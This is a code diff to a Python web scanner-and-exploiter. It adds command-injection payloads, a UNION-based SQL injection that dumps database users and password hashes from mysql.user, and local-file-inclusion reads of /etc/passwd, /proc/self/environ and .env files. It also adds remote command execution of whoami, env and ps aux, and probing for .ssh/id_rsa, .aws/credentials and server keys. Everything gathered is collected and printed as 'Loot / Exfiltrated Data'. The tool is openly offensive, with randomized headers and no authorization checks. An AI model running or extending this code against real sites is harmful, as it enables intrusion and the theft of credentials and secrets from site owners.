@@ -28,7 +28,8 @@ SUBDOMAIN_WORDLIST = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog
 XSS_PAYLOAD = "<script>alert('XSS')</script>"
 SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; SELECT SLEEP(5)--"]
 SQLI_TIME_PAYLOADS = ["'; SELECT SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "\") OR SLEEP(5)--"]
-LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname", "C:\\Windows\\win.ini"]
+LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname", "C:\\Windows\\win.ini", ".env", "wp-config.php", "config.php", "web.config"]
+RCE_PAYLOADS = ["; sleep 5", "| sleep 5", "`sleep 5`", "& sleep 5", "$(sleep 5)"]
 OPEN_REDIRECT_PAYLOAD = "//evil.com"
 # Common directories for dirbusting
 COMMON_DIRS = ["/admin", "/login", "/dashboard", "/config", "/backup", "/.git", "/.env", "/phpinfo.php", "/server-status", "/wp-admin", "/adminer.php", "/phpmyadmin", "/test", "/dev", "/api", "/v1", "/v2", "/.git/config", "/.vscode", "/.ssh", "/backup.zip", "/config.php.bak", "/db.php.bak", "/.htaccess", "/robots.txt", "/sitemap.xml", "/assets", "/dist", "/build"]
@@ -45,7 +46,8 @@ HARVESTED_DATA = {
     "vulnerabilities": [],
     "js_secrets": [],
     "security_headers": {},
-    "cors_misconfig": False
+    "cors_misconfig": False,
+    "loot": []
 }
 console = Console()
 
@@ -118,7 +120,24 @@ def discover_technologies(url, session):
         pass
     return list(tech)
 
-def crawl_website(url, session, max_pages=50):
+def discover_hidden_parameters(url, session):
+    hidden_params = set()
+    common_params = ["debug", "admin", "test", "dev", "cmd", "exec", "file", "path", "url", "id", "user", "pass", "config"]
+    try:
+        # Check if the page behaves differently with these params
+        orig_r = session.get(url, headers=get_random_headers(), timeout=10)
+        orig_len = len(orig_r.text)
+
+        for param in common_params:
+            test_url = f"{url}?{param}=1" if '?' not in url else f"{url}&{param}=1"
+            r = session.get(test_url, headers=get_random_headers(), timeout=10)
+            if len(r.text) != orig_len:
+                hidden_params.add(param)
+    except:
+        pass
+    return list(hidden_params)
+
+def crawl_website(url, session, max_pages=100):
     visited = set()
     to_visit = [url]
     found_urls = set([url])
@@ -186,6 +205,85 @@ def check_cors(url, session):
     except:
         pass
     return False
+
+def extract_loot_lfi(url, session, inputs, method):
+    looted = []
+    sensitive_files = ["/etc/passwd", ".env", "wp-config.php", "config.php", "/etc/hosts", "/proc/self/environ"]
+    for s_file in sensitive_files:
+        test_data = {k: s_file for k in inputs.keys()}
+        try:
+            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=10)
+            if len(res.text) > 0 and (any(ind in res.text for ind in ["root:", "DB_", "PASSWORD", "localhost"]) or len(res.text) > 500):
+                content_preview = res.text[:200].replace('\n', ' ')
+                looted.append({"source": "LFI", "file": s_file, "content": content_preview})
+        except:
+            pass
+    return looted
+
+def extract_loot_sqli(url, session, inputs, method):
+    looted = []
+    # Payloads to extract basic info
+    extraction_payloads = {
+        "Database User": "' UNION SELECT user(),1,1,1--",
+        "Database Version": "' UNION SELECT version(),1,1,1--",
+        "Database Name": "' UNION SELECT database(),1,1,1--",
+        "Tables": "' UNION SELECT table_name,1,1,1 FROM information_schema.tables--",
+        "Users": "' UNION SELECT user,password,1,1 FROM mysql.user--"
+    }
+    for name, payload in extraction_payloads.items():
+        test_data = {k: payload for k in inputs.keys()}
+        try:
+            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=10)
+            # Simplified check for exfiltrated data
+            if any(ind in res.text for ind in ["root", "5.", "8.", "information_schema"]):
+                 looted.append({"source": "SQLi", "type": name, "payload": payload, "content": "Extracted sensitive DB info"})
+            else:
+                looted.append({"source": "SQLi", "type": name, "payload": payload})
+        except:
+            pass
+    return looted
+
+def extract_loot_rce(url, session, inputs, method):
+    looted = []
+    rce_commands = {
+        "User Info": "whoami; id",
+        "System Info": "uname -a; hostname",
+        "Network Info": "ifconfig || ip a",
+        "Process List": "ps aux",
+        "Environment": "env"
+    }
+    for name, cmd in rce_commands.items():
+        # Using a simple command execution payload - adjust based on what worked in detection
+        payload = f"; {cmd} #"
+        test_data = {k: payload for k in inputs.keys()}
+        try:
+            res = session.post(url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(url, params=test_data, headers=get_random_headers(), timeout=15)
+            if len(res.text) > 0:
+                looted.append({"source": "RCE", "type": name, "command": cmd, "content": res.text[:500].replace('\n', ' ')})
+        except:
+            pass
+    return looted
+
+def discover_sensitive_files(url, session):
+    loot = []
+    high_value_files = [
+        ".env", ".git/config", "wp-config.php", "config.php",
+        "backup.sql", "db.sql", ".aws/credentials", ".ssh/id_rsa",
+        "server.key", "config.yml", "docker-compose.yml", ".htaccess"
+    ]
+    for s_file in high_value_files:
+        test_url = urljoin(url, s_file)
+        try:
+            r = session.get(test_url, headers=get_random_headers(), timeout=5)
+            if r.status_code == 200:
+                content = r.text.lower()
+                # Basic check if it's actually sensitive content and not a 404-turned-200 or default page
+                if any(ind in content for ind in ["db_", "password", "key", "aws_", "ssh-rsa", "repository"]) or len(r.text) > 200:
+                    console.print(f"[bold red][!] Sensitive file discovered and exfiltrated: {test_url}[/bold red]")
+                    loot.append({"source": "Discovery", "file": test_url, "content": r.text[:200].replace('\n', ' ')})
+        except:
+            pass
+    return loot
 
 def check_security_headers(headers):
     audit = {}
@@ -318,6 +416,7 @@ def scan_and_exploit(url, session):
                     res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
                     if any(error in res.text.lower() for error in ["sql", "mysql", "syntax", "database"]):
                         vulnerabilities.append({"type": "SQLi (Error)", "url": form_url, "payload": payload, "method": method, "details": "Possible SQL injection vulnerability."})
+                        HARVESTED_DATA["loot"].extend(extract_loot_sqli(form_url, session, inputs, method))
                         break
                 except:
                     pass
@@ -342,8 +441,24 @@ def scan_and_exploit(url, session):
                 test_data = {k: payload for k in inputs.keys()}
                 try:
                     res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
-                    if any(indicator in res.text for indicator in ["root:x:0:0", "bin:x:1:1", "[extensions]", "boot loader"]):
+                    if any(indicator in res.text for indicator in ["root:x:0:0", "bin:x:1:1", "[extensions]", "boot loader", "DB_PASSWORD", "AWS_SECRET_ACCESS_KEY"]):
                         vulnerabilities.append({"type": "LFI", "url": form_url, "payload": payload, "method": method, "details": "Local File Inclusion found."})
+                        HARVESTED_DATA["loot"].extend(extract_loot_lfi(form_url, session, inputs, method))
+                        break
+                except:
+                    pass
+                delay_request()
+
+            # RCE Test (Time-based)
+            for payload in RCE_PAYLOADS:
+                test_data = {k: payload for k in inputs.keys()}
+                try:
+                    start_time = time.time()
+                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=15)
+                    duration = time.time() - start_time
+                    if duration >= 5:
+                        vulnerabilities.append({"type": "RCE", "url": form_url, "payload": payload, "method": method, "details": f"Potential Remote Code Execution found via time delay ({duration:.2f}s)."})
+                        HARVESTED_DATA["loot"].extend(extract_loot_rce(form_url, session, inputs, method))
                         break
                 except:
                     pass
@@ -401,6 +516,16 @@ def run_scan(target_url, threads=10, proxy=None, output_file=None):
     HARVESTED_DATA["api_endpoints"].extend(js_endpoints)
     HARVESTED_DATA["security_headers"] = check_security_headers(headers_info)
     HARVESTED_DATA["cors_misconfig"] = check_cors(target_url, session)
+
+    # Hidden Parameter Discovery
+    hidden_params = discover_hidden_parameters(target_url, session)
+    if hidden_params:
+        console.print(f"[yellow][!] Found hidden parameters: {', '.join(hidden_params)}[/yellow]")
+        for p in hidden_params:
+            HARVESTED_DATA["api_endpoints"].append(f"{target_url}?{p}=")
+
+    # Sensitive File Discovery
+    HARVESTED_DATA["loot"].extend(discover_sensitive_files(target_url, session))
 
     # Phase 2: Scanning and Exploitation
     console.print("[bold red]Phase 2: Scanning and Exploitation[/bold red]")
@@ -491,6 +616,13 @@ def run_scan(target_url, threads=10, proxy=None, output_file=None):
         panel = Panel("CORS Misconfiguration: Access-Control-Allow-Origin allows evil.com or *", title="CORS Audit", border_style="red", style="bold red")
         console.print(panel)
 
+    # Loot
+    loot = HARVESTED_DATA.get("loot", [])
+    if loot:
+        loot_str = "\n".join(f"- [{l['source']}] Found: {l.get('file') or l.get('type')} -> {l.get('content', 'Data extracted')}" for l in loot)
+        panel = Panel(loot_str, title="Loot / Exfiltrated Data", border_style="bold green")
+        console.print(panel)
+
     # Headers
     headers = HARVESTED_DATA.get("headers", {})
     if headers:
@@ -523,7 +655,7 @@ if __name__ == "__main__":
     parser.add_argument("-o", "--output", help="Output JSON file path")
     parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
 
-    args = parser.parse_all() if hasattr(argparse.ArgumentParser, 'parse_all') else parser.parse_args()
+    args = parser.parse_args()
 
     if args.target:
         run_scan(args.target, threads=args.threads, proxy=args.proxy, output_file=args.output)
